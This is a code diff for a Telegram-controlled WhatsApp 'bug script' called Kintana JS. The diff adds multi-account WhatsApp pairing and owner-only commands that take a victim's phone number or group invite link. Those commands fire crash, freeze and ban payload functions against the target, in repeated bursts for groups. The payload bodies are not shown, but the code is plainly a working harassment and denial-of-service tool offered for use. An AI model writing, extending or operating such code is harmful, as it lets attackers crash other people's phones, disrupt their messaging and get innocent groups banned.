@@ -505,6 +505,645 @@ ${rowsHtml}
   return sock;
 }
 
+// ================================================================
+// ==================== FITUR /botwa (WA PAIRING) =================
+// ================================================================
+// Command /botwa khusus owner buat connect nomor WA
+// Support sampe 10 bot WA sekaligus
+// Setelah connect, kirim .menu dari WA buat tampilkan menu
+// ================================================================
+
+const WA_PAIRING_CODE = "SAKA4444";
+const MAX_WA_BOTS = 10;
+const waSessions = new Map(); // number -> { sock, jid, ownerId, type, connectedAt }
+
+// ==================== CEK BATAS BOT WA ====================
+function canAddMoreWABots() {
+  const activeCount = Array.from(waSessions.values()).filter(d => d.type === "wa" || d.sock).length;
+  return activeCount < MAX_WA_BOTS;
+}
+
+// ==================== MENU WA (kaya /start Telegram) ====================
+async function sendWAMenu(sock, from, mek, sender) {
+  const pushname = mek.pushName || "User";
+  const uptime = process.uptime();
+  const uptimeStr = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m`;
+  const greeting = getGreeting();
+
+  const menuText = `╭━━━「 *KINTANA JS* 」━━━╮
+┃
+┃ ${greeting}, *${pushname}*
+┃
+┃ 🤖 *Bot:* Kintana JavaScript
+┃ 📦 *Versi:* 7.2.0
+┃ ⏱️ *Uptime:* ${uptimeStr}
+┃ 🌐 *Platform:* WhatsApp
+┃
+╰━━━━━━━━━━━━━━━━━━╯
+
+╭━━━「 *MENU UTAMA* 」━━━╮
+┃
+┃ ▸ .menu    — tampilkan menu ini
+┃ ▸ .ping    — cek respon bot
+┃ ▸ .owner   — kontak owner
+┃ ▸ .status  — status bot
+┃
+╰━━━━━━━━━━━━━━━━━━╯
+
+╭━━━「 *ANDROID BUG* 」━━━╮
+┃
+┃ ▸ .delayhard  — delay hard crash
+┃ ▸ .crashmeow  — crash hard
+┃ ▸ .blankclick — crash click
+┃ ▸ .frezehard  — freeze x delay
+┃
+╰━━━━━━━━━━━━━━━━━━╯
+
+╭━━━「 *GROUP BUG* 」━━━╮
+┃
+┃ ▸ .groupcrash — blank group x delay
+┃ ▸ .groupban   — ban group
+┃
+╰━━━━━━━━━━━━━━━━━━╯
+
+_Ketik command dengan awalan titik (.)_
+_Command bug = owner only_
+
+— Kintana JavaScript
+Built with Code, Developed with Dedication.`;
+
+  try {
+    await sock.sendMessage(from, {
+      text: menuText,
+      contextInfo: {
+        mentionedJid: [sender],
+        externalAdReply: {
+          title: "Kintana JavaScript",
+          body: "WhatsApp Bug Script by Heysaka",
+          thumbnailUrl: "https://files.catbox.moe/5izqwp.jpg",
+          sourceUrl: "https://t.me/kintanaofficial",
+          mediaType: 1,
+          renderLargerThumbnail: true,
+          showAdAttribution: false
+        }
+      }
+    }, { quoted: mek });
+  } catch (err) {
+    console.error("[botwa] menu error:", err?.message);
+  }
+}
+
+// ==================== HANDLER PESAN WA ====================
+async function handleWAMessage(sock, number, chatUpdate) {
+  try {
+    const mek = chatUpdate.messages[0];
+    if (!mek.message) return;
+    if (chatUpdate.type !== "notify") return;
+
+    mek.message = Object.keys(mek.message)[0] === "ephemeralMessage"
+      ? mek.message.ephemeralMessage.message
+      : mek.message;
+
+    const from = mek.key.remoteJid;
+    const isGroup = from.endsWith("@g.us");
+    const sender = mek.key.fromMe
+      ? sock.user.id.split(":")[0] + "@s.whatsapp.net"
+      : (mek.key.participant || mek.key.remoteJid);
+
+    const type = getContentType(mek.message);
+    const body = (type === "conversation" && mek.message.conversation)
+      || (type === "extendedTextMessage" && mek.message.extendedTextMessage.text)
+      || (type === "imageMessage" && mek.message.imageMessage.caption)
+      || (type === "videoMessage" && mek.message.videoMessage.caption)
+      || "";
+
+    if (!body.startsWith(".")) return;
+
+    const command = body.slice(1).trim().split(/\s+/)[0].toLowerCase();
+    const args = body.trim().split(/\s+/).slice(1);
+
+    console.log(`[wa-cmd] ${sender.split("@")[0]} -> .${command} (bot ${number})`);
+
+    // ==== CEK OWNER ====
+    const senderNumber = sender.split("@")[0];
+    const ownerNumbers = (config.OWNER_ID || []).map(n => String(n).replace(/\D/g, ""));
+    const isOwnerWA = ownerNumbers.includes(senderNumber);
+
+    const ownerCommands = ["delayhard", "crashmeow", "blankclick", "frezehard", "groupcrash", "groupban", "connect", "disconnect", "bug"];
+
+    if (ownerCommands.includes(command) && !isOwnerWA) {
+      return sock.sendMessage(from, {
+        text: "🔒 *Access Denied*\n\nCommand ini hanya untuk owner bot."
+      }, { quoted: mek });
+    }
+
+    switch (command) {
+      case "menu": {
+        await sendWAMenu(sock, from, mek, sender);
+        break;
+      }
+
+      case "ping": {
+        const t0 = Date.now();
+        await sock.sendMessage(from, {
+          text: `🏓 *Pong!*\n\n⚡ Respon: ${Date.now() - t0}ms\n📡 Status: Online\n🔌 Bot: ${number}`
+        }, { quoted: mek });
+        break;
+      }
+
+      case "owner": {
+        await sock.sendMessage(from, {
+          text: `👑 *Owner Bot*\n\n📱 Telegram: @heysaka\n📢 Channel: t.me/kintanaofficial\n🌐 Script: Kintana JavaScript v7.2.0`
+        }, { quoted: mek });
+        break;
+      }
+
+      case "status": {
+        const uptime = process.uptime();
+        const mem = process.memoryUsage();
+        const memMB = (mem.rss / 1024 / 1024).toFixed(2);
+        await sock.sendMessage(from, {
+          text: `📊 *Bot Status*\n\n⏱️ Uptime: ${Math.floor(uptime / 60)} menit\n💾 Memory: ${memMB} MB\n🔌 Bot: ${number}\n📦 Version: 7.2.0`
+        }, { quoted: mek });
+        break;
+      }
+
+      // ==================== COMMAND BUG (WA) ====================
+      case "delayhard": {
+        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .delayhard 628123456789" }, { quoted: mek });
+        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
+        await sock.sendMessage(from, { text: `🚀 Mengirim bug .delayhard ke ${args[0]}...` }, { quoted: mek });
+        try {
+          await bug1(sock, target);
+          await bug1(sock, target);
+          await sock.sendMessage(from, { text: `✅ Bug .delayhard terkirim ke ${args[0]}` }, { quoted: mek });
+        } catch (e) {
+          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
+        }
+        break;
+      }
+
+      case "crashmeow": {
+        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .crashmeow 628123456789" }, { quoted: mek });
+        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
+        await sock.sendMessage(from, { text: `🚀 Mengirim bug .crashmeow ke ${args[0]}...` }, { quoted: mek });
+        try {
+          await bug2(sock, target);
+          await bug2(sock, target);
+          await sock.sendMessage(from, { text: `✅ Bug .crashmeow terkirim ke ${args[0]}` }, { quoted: mek });
+        } catch (e) {
+          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
+        }
+        break;
+      }
+
+      case "blankclick": {
+        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .blankclick 628123456789" }, { quoted: mek });
+        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
+        await sock.sendMessage(from, { text: `🚀 Mengirim bug .blankclick ke ${args[0]}...` }, { quoted: mek });
+        try {
+          await bug3(sock, target);
+          await bug3(sock, target);
+          await sock.sendMessage(from, { text: `✅ Bug .blankclick terkirim ke ${args[0]}` }, { quoted: mek });
+        } catch (e) {
+          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
+        }
+        break;
+      }
+
+      case "frezehard": {
+        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .frezehard 628123456789" }, { quoted: mek });
+        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
+        await sock.sendMessage(from, { text: `🚀 Mengirim bug .frezehard ke ${args[0]}...` }, { quoted: mek });
+        try {
+          await bug4(sock, target);
+          await bug4(sock, target);
+          await sock.sendMessage(from, { text: `✅ Bug .frezehard terkirim ke ${args[0]}` }, { quoted: mek });
+        } catch (e) {
+          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
+        }
+        break;
+      }
+
+      case "groupcrash": {
+        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .groupcrash https://chat.whatsapp.com/xxxxx" }, { quoted: mek });
+        const inviteCode = args[0].match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)?.[1];
+        if (!inviteCode) return sock.sendMessage(from, { text: "❌ Link grup tidak valid." }, { quoted: mek });
+        try {
+          const groupInfo = await sock.groupGetInviteInfo(inviteCode);
+          const groupJid = groupInfo.id;
+          await sock.sendMessage(from, { text: `🚀 Mengirim bug grup ke ${groupInfo.subject}...` }, { quoted: mek });
+          for (let i = 0; i < 20; i++) {
+            await Promise.allSettled([
+              kitow(sock, groupJid).catch(() => {}),
+              kicaumania(sock, groupJid).catch(() => {}),
+              GbCrash(sock, groupJid).catch(() => {})
+            ]);
+            await sleep(500);
+          }
+          await sock.sendMessage(from, { text: `✅ Bug grup terkirim.` }, { quoted: mek });
+        } catch (e) {
+          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
+        }
+        break;
+      }
+
+      case "groupban": {
+        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .groupban https://chat.whatsapp.com/xxxxx" }, { quoted: mek });
+        const inviteCode = args[0].match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)?.[1];
+        if (!inviteCode) return sock.sendMessage(from, { text: "❌ Link grup tidak valid." }, { quoted: mek });
+        try {
+          const groupInfo = await sock.groupGetInviteInfo(inviteCode);
+          const groupJid = groupInfo.id;
+          await sock.sendMessage(from, { text: `🚀 Ban grup ${groupInfo.subject}...` }, { quoted: mek });
+          await bansgc(sock, groupJid);
+          await sock.sendMessage(from, { text: `✅ Selesai.` }, { quoted: mek });
+        } catch (e) {
+          await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
+        }
+        break;
+      }
+
+      default:
+        break;
+    }
+  } catch (err) {
+    console.error("[botwa] messages.upsert error:", err?.message);
+  }
+}
+
+// ==================== /botwa ====================
+bot.onText(/^\/botwa(?:\s+(.+))?$/i, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
+
+  if (!isOwner(userId)) return restricted(chatId);
+
+  if (!canAddMoreWABots()) {
+    return sendRichMenu(chatId,
+      `<h3>limit reached</h3>
+<table border="2">
+<tr><th>info</th><th>detail</th></tr>
+<tr><td>max bots</td><td>${MAX_WA_BOTS}</td></tr>
+<tr><td>status</td><td>limit tercapai, hapus bot lain dulu</td></tr>
+<tr><td>command</td><td>/delbotwa &lt;nomor&gt;</td></tr>
+</table>`,
+      null,
+      msg.message_id
+    );
+  }
+
+  if (!match[1]) {
+    return sendRichMenu(chatId,
+      `<h3>missing input</h3>
+<table border="2">
+<tr><th>info</th><th>detail</th></tr>
+<tr><td>command</td><td>/botwa</td></tr>
+<tr><td>example</td><td>/botwa 628123456789</td></tr>
+<tr><td>max bots</td><td>${MAX_WA_BOTS}</td></tr>
+</table>`,
+      { inline_keyboard: [[{ text: "creator", url: "https://t.me/heysaka", style: "primary", icon_custom_emoji_id: "5319301933645707826" }]] },
+      msg.message_id
+    );
+  }
+
+  let number = match[1].replace(/[^0-9]/g, "");
+  if (number.startsWith("0")) number = "62" + number.slice(1);
+  if (!number.startsWith("62")) number = "62" + number;
+
+  if (number.length < 10 || number.length > 15) {
+    return sendRichMenu(chatId,
+      `<h3>invalid number</h3>
+<table border="2">
+<tr><th>info</th><th>detail</th></tr>
+<tr><td>input</td><td>${number}</td></tr>
+<tr><td>status</td><td>format nomor tidak valid</td></tr>
+</table>`,
+      null,
+      msg.message_id
+    );
+  }
+
+  if (waSessions.has(number)) {
+    const s = waSessions.get(number);
+    return sendRichMenu(chatId,
+      `<h3>already connected</h3>
+<table border="2">
+<tr><th>info</th><th>detail</th></tr>
+<tr><td>number</td><td>${number}</td></tr>
+<tr><td>status</td><td>already connected</td></tr>
+<tr><td>since</td><td>${new Date(s.connectedAt || Date.now()).toLocaleString()}</td></tr>
+</table>`,
+      null,
+      msg.message_id
+    );
+  }
+
+  const token = bot.token;
+  let statusId = null;
+  try {
+    const res = await axios.post(`https://api.telegram.org/bot${token}/sendRichMessage`, {
+      chat_id: chatId,
+      rich_message: {
+        html: `<h3>botwa connection</h3>
+<table border="2">
+<tr><th>info</th><th>detail</th></tr>
+<tr><td>number</td><td>${number}</td></tr>
+<tr><td>status</td><td>initializing...</td></tr>
+</table>`
+      }
+    });
+    statusId = res?.data?.result?.message_id;
+  } catch (e) {
+    console.error("botwa init status:", e?.message);
+  }
+
+  const updateStatus = async (title, rows) => {
+    if (!statusId) return;
+    let rowsHtml = "";
+    for (const [k, v] of rows) rowsHtml += `<tr><td>${k}</td><td>${v}</td></tr>\n`;
+    try {
+      await axios.post(`https://api.telegram.org/bot${token}/editMessageText`, {
+        chat_id: chatId,
+        message_id: statusId,
+        rich_message: {
+          html: `<h3>${title}</h3>
+<table border="2">
+<tr><th>info</th><th>detail</th></tr>
+${rowsHtml}
+</table>`
+        }
+      });
+    } catch (e) {
+      console.error("botwa edit status:", e?.message);
+    }
+  };
+
+  const sessionDir = path.join(SESSIONS_DIR, `wa_${number}`);
+  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
+
+  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+
+  const sock = makeWASocket({
+    auth: state,
+    printQRInTerminal: false,
+    logger: P({ level: "silent" }),
+    defaultQueryTimeoutMs: undefined,
+    browser: ["Ubuntu", "Chrome", "20.0.00"],
+  });
+
+  sock.ev.on("connection.update", async (update) => {
+    const { connection, lastDisconnect } = update;
+
+    if (connection === "connecting") {
+      await sleep(1500);
+      try {
+        if (!fs.existsSync(path.join(sessionDir, "creds.json"))) {
+          const code = await sock.requestPairingCode(number, WA_PAIRING_CODE);
+          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
+
+          await updateStatus("botwa pairing", [
+            ["number", number],
+            ["pairing code", `<b>${formatted}</b>`],
+            ["status", "masukkan kode di WhatsApp"],
+            ["note", "buka WhatsApp → Linked Devices → Link with phone number"]
+          ]);
+
+          await bot.sendMessage(chatId, `🔑 <b>Pairing Code:</b> <code>${code}</code>`, {
+            parse_mode: "HTML",
+            reply_to_message_id: msg.message_id
+          });
+        }
+      } catch (err) {
+        console.error("botwa pairing error:", err?.message);
+        await updateStatus("botwa error", [
+          ["number", number],
+          ["status", "gagal generate pairing code"],
+          ["error", err.message]
+        ]);
+      }
+    }
+
+    if (connection === "open") {
+      waSessions.set(number, {
+        sock,
+        jid: sock.user.id,
+        ownerId: userId,
+        type: "wa",
+        connectedAt: Date.now()
+      });
+      saveActiveSessions(number, "wa", userId);
+
+      await updateStatus("botwa connected", [
+        ["number", number],
+        ["jid", sock.user.id],
+        ["status", "berhasil terhubung"],
+        ["command wa", "kirim <code>.menu</code> dari nomor lain"]
+      ]);
+
+      console.log(`[botwa] ${number} connected`);
+    }
+
+    if (connection === "close") {
+      const statusCode = lastDisconnect?.error?.output?.statusCode;
+      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
+
+      waSessions.delete(number);
+
+      if (shouldReconnect) {
+        await updateStatus("botwa reconnecting", [
+          ["number", number],
+          ["status", "koneksi terputus, mencoba ulang..."]
+        ]);
+        setTimeout(() => reconnectWABot(number, userId), 3000);
+      } else {
+        removeActiveSession(number);
+        try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch (_) {}
+        await updateStatus("botwa logout", [
+          ["number", number],
+          ["status", "session dihapus, pairing ulang /botwa " + number]
+        ]);
+      }
+    }
+  });
+
+  sock.ev.on("creds.update", saveCreds);
+
+  sock.ev.on("messages.upsert", async (chatUpdate) => {
+    await handleWAMessage(sock, number, chatUpdate);
+  });
+
+  waSessions.set(number, { sock, pending: true });
+});
+
+// ==================== /listbotwa ====================
+bot.onText(/^\/listbotwa$/i, async (msg) => {
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
+
+  if (!isOwner(userId) && !adminUsers.includes(userId)) {
+    return restricted(chatId);
+  }
+
+  const waList = Array.from(waSessions.entries()).filter(([_, d]) => d.type === "wa" || d.sock);
+
+  if (waList.length === 0) {
+    return sendRichMenu(chatId,
+      `<h3>wa bot list</h3>
+<table border="2">
+<tr><th>info</th><th>detail</th></tr>
+<tr><td>status</td><td>belum ada bot wa yang connect</td></tr>
+<tr><td>cara</td><td>kirim /botwa 628xxx</td></tr>
+<tr><td>max</td><td>${MAX_WA_BOTS} bot</td></tr>
+</table>`
+    );
+  }
+
+  let rowsHtml = "";
+  let i = 1;
+  for (const [number, data] of waList) {
+    const status = data.sock?.user ? "connected" : "pending";
+    const jid = data.jid || data.sock?.user?.id || "-";
+    const since = data.connectedAt ? new Date(data.connectedAt).toLocaleString() : "-";
+    rowsHtml += `<tr><td>${i}</td><td>${number}</td><td>${status}</td><td>${jid}</td><td>${since}</td></tr>\n`;
+    i++;
+  }
+
+  await sendRichMenu(chatId,
+    `<h3>wa bot list</h3>
+<table border="2">
+<tr><th>#</th><th>number</th><th>status</th><th>jid</th><th>since</th></tr>
+${rowsHtml}
+</table>
+
+<p>total: ${waList.length}/${MAX_WA_BOTS} wa bot</p>`
+  );
+});
+
+// ==================== /delbotwa ====================
+bot.onText(/^\/delbotwa(?:\s+(.+))?$/i, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
+
+  if (!isOwner(userId)) return restricted(chatId);
+
+  if (!match[1]) {
+    return sendRichMenu(chatId,
+      `<h3>missing input</h3>
+<table border="2">
+<tr><th>info</th><th>detail</th></tr>
+<tr><td>command</td><td>/delbotwa</td></tr>
+<tr><td>example</td><td>/delbotwa 628123456789</td></tr>
+</table>`,
+      null,
+      msg.message_id
+    );
+  }
+
+  const number = match[1].replace(/\D/g, "");
+  const data = waSessions.get(number);
+
+  if (!data) {
+    return sendRichMenu(chatId,
+      `<h3>not found</h3>
+<table border="2">
+<tr><th>info</th><th>detail</th></tr>
+<tr><td>number</td><td>${number}</td></tr>
+<tr><td>status</td><td>tidak ditemukan</td></tr>
+</table>`,
+      null,
+      msg.message_id
+    );
+  }
+
+  try {
+    if (data.sock) await data.sock.logout().catch(() => {});
+    waSessions.delete(number);
+    removeActiveSession(number);
+    const sessionDir = path.join(SESSIONS_DIR, `wa_${number}`);
+    if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });
+
+    await sendRichMenu(chatId,
+      `<h3>wa bot deleted</h3>
+<table border="2">
+<tr><th>info</th><th>detail</th></tr>
+<tr><td>number</td><td>${number}</td></tr>
+<tr><td>status</td><td>berhasil dihapus</td></tr>
+</table>`,
+      null,
+      msg.message_id
+    );
+  } catch (e) {
+    await sendRichMenu(chatId,
+      `<h3>error</h3>
+<table border="2">
+<tr><th>info</th><th>detail</th></tr>
+<tr><td>message</td><td>${e.message}</td></tr>
+</table>`,
+      null,
+      msg.message_id
+    );
+  }
+});
+
+// ==================== RECONNECT WA ====================
+async function reconnectWABot(number, ownerId) {
+  const sessionDir = path.join(SESSIONS_DIR, `wa_${number}`);
+  if (!fs.existsSync(sessionDir)) return;
+
+  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+
+  const sock = makeWASocket({
+    auth: state,
+    printQRInTerminal: false,
+    logger: P({ level: "silent" }),
+    defaultQueryTimeoutMs: undefined,
+  });
+
+  sock.ev.on("connection.update", async (update) => {
+    const { connection } = update;
+    if (connection === "open") {
+      waSessions.set(number, {
+        sock,
+        jid: sock.user.id,
+        ownerId,
+        type: "wa",
+        connectedAt: Date.now()
+      });
+      console.log(`[botwa] ${number} reconnected`);
+    }
+    if (connection === "close") {
+      waSessions.delete(number);
+      setTimeout(() => reconnectWABot(number, ownerId), 5000);
+    }
+  });
+
+  sock.ev.on("creds.update", saveCreds);
+  sock.ev.on("messages.upsert", async (chatUpdate) => {
+    await handleWAMessage(sock, number, chatUpdate);
+  });
+}
+
+// ==================== INIT WA SESSIONS (AUTO RESTORE) ====================
+async function initializeWABotSessions() {
+  try {
+    if (!fs.existsSync(SESSIONS_FILE)) return;
+    const active = JSON.parse(fs.readFileSync(SESSIONS_FILE));
+    for (const [number, data] of Object.entries(active)) {
+      if (data?.type === "wa") {
+        if (!canAddMoreWABots()) {
+          console.log(`[botwa] skip restore ${number}, limit reached`);
+          continue;
+        }
+        console.log(`[botwa] restoring session ${number}...`);
+        await reconnectWABot(number, data.ownerId);
+      }
+    }
+  } catch (e) {
+    console.error("[botwa] init sessions error:", e?.message);
+  }
+}
+
 async function fetchAndValidateToken() {
   try {
     const response = await axios.get('https://raw.githubusercontent.com/nonoluteam-debug/database/refs/heads/main/token.json');
@@ -598,6 +1237,7 @@ function getBotRuntime() {
 async function initializeBot() {
   console.log(`kintana is now active on your bot 👊`);
   await initializeWhatsAppConnections();
+  await initializeWABotSessions(); // <-- tambahin ini
 }
 
 //============================//
@@ -2089,7 +2729,7 @@ bot.onText(/\/(delaygroup)(?:\s+(.+))?/, async (msg, match) => {
 </table>`,
     {
       inline_keyboard: [
-        [{ text: 'script info', url: "https://t.me/kintanaofficial" }, { text: 'group link', url: link }]
+        [{ text: 'script info', url: "https://t.me/kintanaofficial", style: "primary" }, { text: 'group link', url: link, style: "primary" }]
       ]
     }
   );
@@ -2246,7 +2886,7 @@ bot.onText(/\/(groupcrash)(?:\s+(.+))?/, async (msg, match) => {
 </table>`,
     {
       inline_keyboard: [
-        [{ text: 'script info', url: "https://t.me/kintanaofficial" }, { text: 'group link', url: link }]
+        [{ text: 'script info', url: "https://t.me/kintanaofficial", style: "primary" }, { text: 'group link', url: link, style: "primary" }]
       ]
     }
   );
@@ -2403,7 +3043,7 @@ bot.onText(/\/(groupban)(?:\s+(.+))?/, async (msg, match) => {
 </table>`,
     {
       inline_keyboard: [
-        [{ text: 'script info', url: "https://t.me/kintanaofficial" }, { text: 'group link', url: link }]
+        [{ text: 'script info', url: "https://t.me/kintanaofficial", style: "primary" }, { text: 'group link', url: link, style: "primary" }]
       ]
     }
   );
